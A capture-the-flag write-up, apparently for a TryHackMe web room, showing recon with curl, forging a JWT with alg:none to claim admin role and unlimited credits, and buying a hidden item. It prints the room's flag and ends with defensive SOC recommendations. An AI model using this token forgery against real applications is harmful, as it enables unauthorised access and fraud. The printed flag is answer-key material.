@@ -1,0 +1,93 @@
+# Room Name - TryHackMe: TryHeartMe
+Date: 02 August 2026
+Difficulty: Easy
+Category: Web Exploitation / JWT Bypass / Broken Access Control
+
+# Scenario
+The TryHeartMe shop is open for business. Find a way to purchase the hidden Valenflag item that is not listed anywhere on the site. The challenge involved identifying client-side JWT session state, exploiting a classic JWT algorithm confusion bypass to forge admin credentials, and purchasing a hidden item to retrieve the flag.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- curl
+- Python 3 (JWT token forging)
+
+# What I Did
+
+Step 1 — Reconnaissance
+- Ran a curl HEAD request to fingerprint the web server:
+```
+curl -I http://10.48.183.226:5000
+```
+- Confirmed the application was running on Werkzeug/Python 3.12.3 (Flask).
+- Browsed the homepage and found 4 linked products via slug-based routes such as /product/heart-choco and /product/rose-bouquet.
+- Confirmed no Valenflag item was linked anywhere on the site.
+
+Step 2 — Enumerate hidden product slugs
+- Attempted slug guessing against the product route with common values: valenflag, hidden, secret, and numeric IDs.
+- All returned 404, confirming the item was not publicly accessible through direct URL enumeration.
+
+Step 3 — Register an account and inspect the session cookie
+- Registered a new account:
+```
+curl -c cookies_th.txt -X POST http://10.48.183.226:5000/register \
+  -d "email=attacker@test.local&password=password123&next="
+```
+- Account was created with 0 credits. The site stated online top-ups were disabled.
+- Decoded the tryheartme_jwt cookie and found all session state stored client-side in a JWT:
+```json
+{"email": "attacker@test.local", "role": "user", "credits": 0, "iat": ..., "theme": "valentine"}
+```
+
+Step 4 — Exploit JWT alg:none bypass
+- Identified that the role and credits fields were stored in the client-controlled JWT payload.
+- Tested the classic JWT algorithm confusion attack by forging a token with alg set to none and an empty signature, requiring no valid HMAC:
+```python
+header  = {'alg': 'none', 'typ': 'JWT'}
+payload = {'email': 'attacker@test.local', 'role': 'admin', 'credits': 999999, ...}
+token   = f'{header_b64}.{payload_b64}.'
+```
+- Sent the forged token as the session cookie:
+```
+curl -b "tryheartme_jwt=<forged_token>" http://10.48.183.226:5000/account
+```
+- Server accepted the forged token without signature verification, returning: Credits: 999999, Role: admin, and an Admin portal link.
+
+Step 5 — Access the admin portal to discover the hidden item
+- Accessed the admin panel with the forged token:
+```
+curl -b "tryheartme_jwt=<forged_token>" http://10.48.183.226:5000/admin
+```
+- Found the message: "Staff can purchase the ValenFlag item" with a link to /product/valenflag (777 credits).
+
+Step 6 — Purchase the hidden item
+- Sent a POST request to buy the Valenflag item using the forged token with 999999 credits:
+```
+curl -b "tryheartme_jwt=<forged_token>" -X POST http://10.48.183.226:5000/buy/valenflag
+```
+- Server responded with a 302 redirect to /receipt/valenflag, deducted 777 credits, and issued a new properly signed JWT.
+
+Step 7 — Retrieve the receipt and flag
+- Used the new signed cookie to access the receipt page:
+```
+curl -b "tryheartme_jwt=<new_signed_token>" http://10.48.183.226:5000/receipt/valenflag
+```
+- Retrieved the flag from the receipt page.
+
+# What I Found
+- Web framework: Flask / Werkzeug on Python 3.12.3
+- Session mechanism: Client-side JWT cookie (tryheartme_jwt)
+- JWT vulnerability: alg:none bypass — server trusted the algorithm field declared in the attacker-controlled header
+- Fields controllable via JWT forgery: role, credits
+- Hidden product route: /product/valenflag (777 credits, admin only)
+- Flag: THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
+
+# Key Learning
+The JWT alg:none vulnerability arises when a server reads the algorithm field from the attacker-controlled header and trusts it, rather than enforcing a fixed expected algorithm server-side. By setting alg to none and omitting the signature, an attacker can forge any payload content including role and credit balance with no knowledge of the signing secret. Storing security-sensitive state such as user role and credits in a client-side JWT is fundamentally flawed regardless of signing, because any bypass of signature verification immediately gives the attacker full control over their own session claims.
+
+# What I Would Flag in a Real SOC
+- JWT libraries that accept alg:none or allow the client to specify the verification algorithm are critically misconfigured, the expected algorithm must be hardcoded server-side and the alg field in incoming tokens must be ignored or validated against an allowlist
+- Storing authorisation state such as role and financial balances in client-side tokens is an insecure design pattern, roles and credits must be authoritative server-side and looked up from a database on each request rather than trusted from a cookie
+- A credits balance stored in a client JWT can be set to any value by the attacker without any transaction occurring on the server, all financial or quota logic must be enforced server-side with database-backed validation
+- Admin portal routes that are only hidden from the UI but not protected by server-side role enforcement are a broken access control finding, role checks must occur on every request to protected endpoints regardless of whether a link to that endpoint is visible
+- JWT signature bypass attacks leave no authentication anomaly in standard access logs since the requests appear as normal authenticated sessions, dedicated JWT validation logging and anomaly detection on unusual role or credit values is required to detect this attack class
